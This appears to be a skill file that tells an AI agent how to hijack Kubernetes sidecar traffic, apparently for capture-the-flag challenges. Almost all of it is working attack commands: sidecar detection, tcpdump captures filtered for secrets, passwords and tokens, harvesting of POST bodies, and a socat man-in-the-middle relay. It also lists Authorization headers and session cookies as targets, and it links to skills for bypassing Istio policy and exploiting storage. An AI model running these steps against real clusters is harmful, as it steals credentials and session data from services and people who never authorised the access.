---
name: k8s-sidecar-attack
description: "Kubernetes Sidecar container traffic hijacking and sensitive information theft. Use when the target pod contains an Istio/Envoy/Linkerd sidecar, the challenge mentions a 'hidden bystander' or a 'shared network', or you need to sniff traffic from inside the pod. Covers tcpdump packet capture, plaintext sidecar traffic capture, and shared network namespace abuse. Use this skill whenever you find signs of a sidecar or multiple co-located containers in a K8s pod"
zh-signals: "在 Kubernetes Pod 内利用共享网络命名空间抓取 sidecar 明文流量并窃取敏感信息。信号:k8s,sidecar,istio,tcpdump,流量劫持,抓包"
when-to-use: >-
  Use when a pod contains an Istio/Envoy/Linkerd sidecar or multiple containers share a
  network namespace, and you need to sniff internal traffic from inside the pod.
metadata:
  tags: "k8s,kubernetes,sidecar,istio,envoy,tcpdump,traffic,sniffing,traffic-hijacking,packet-capture"
  category: "cloud"
---

# Kubernetes Sidecar Traffic Hijacking

All containers within the same pod share a network namespace — this is a K8s design decision and a blessing for attackers. Traffic sent by a sidecar container (such as Istio Envoy) can be captured directly with tcpdump by any container in the same pod, because they share the same network interface.

```
Pod network namespace (shared)
┌──────────────────────────────────┐
│  [your container]  ←── same NIC ──→  [Sidecar]  │
│       ↓                        ↓       │
│    tcpdump captures all of the sidecar's traffic        │
└──────────────────────────────────┘
```

---

## Phase 1: Detect the Sidecar

```bash
# Most reliable: look for envoy / pilot-agent / linkerd-proxy in the process list
ps aux 2>/dev/null | grep -E 'envoy|pilot-agent|linkerd'
# Seeing envoy or pilot-agent → confirms an Istio sidecar exists

# Environment variables (set after Istio injection)
env | grep -i istio
# Variables starting with ISTIO_META_* → confirm Istio

# Network interfaces (supporting signal, cannot confirm on its own)
ip addr
# Seeing multiple interfaces besides istio0 / lo → a sidecar may be present, confirm with the checks above

# DNS configuration
cat /etc/resolv.conf  # the search lines contain istio-related entries
```

---

## Phase 2: Traffic Capture

Sidecars usually use plaintext HTTP internally (mTLS terminates at the Envoy layer and is then forwarded), so tcpdump can directly reveal request contents.

### Basic Capture

```bash
# Capture all traffic (-A prints ASCII so you can see HTTP content directly)
tcpdump -A -vvv

# Capture only HTTP traffic (less noise)
tcpdump -A -s 0 'tcp port 80 or tcp port 8080'

# Filter directly for sensitive keywords
tcpdump -A -s 0 | grep -i -A5 'flag\|secret\|password\|token\|key'

# Save a pcap for later analysis with Wireshark
tcpdump -w /tmp/capture.pcap -c 1000
```

### Targeted Capture

```bash
# Capture traffic of a specific service
tcpdump -A host <target-service-ip>

# Capture POST request bodies (credentials usually live in the POST body)
tcpdump -A -s 0 'tcp dst port 80' | grep -A 20 'POST'
```

---

## Phase 3: Analyze the Results

Look for the following in the captured traffic:

1. **HTTP request/response bodies** — flags, tokens, credentials
2. **Authorization headers** — Bearer tokens, Basic auth
3. **Cookies** — session IDs
4. **POST bodies** — form data, JSON payloads
5. **Service-to-service communication** — sensitive data exposed by internal API calls

---

## Alternatives When tcpdump Is Unavailable

```bash
# Inspect current active connections (infer which services are communicating)
cat /proc/net/tcp
cat /proc/net/tcp6
ss -tlnp
netstat -tlnp 2>/dev/null

# If socat is available, you can do port forwarding and intercept traffic as a man-in-the-middle
socat -v TCP-LISTEN:8080,fork TCP:<target-svc>:80
# -v prints both directions of traffic to stderr
```

---

## Notes

- Traffic may be **periodic** (cron job, scheduled reporting), so keep listening for at least **30-60 seconds**
- Pay attention to requests for services named `reporting-service`, `metrics`, `webhook`, and similar
- If everything you capture is encrypted, mTLS is not being terminated at the sidecar layer — change approach and try `Skill(skill="k8s-istio-bypass")` to bypass the policy

## Related Skills

- Haven't done service discovery yet? Use `Skill(skill="k8s-network-recon")` first to determine which services exist
- Found an Istio AuthorizationPolicy blocking you → `Skill(skill="k8s-istio-bypass")`
- Found NFS/EFS mounts → `Skill(skill="k8s-storage-exploit")`
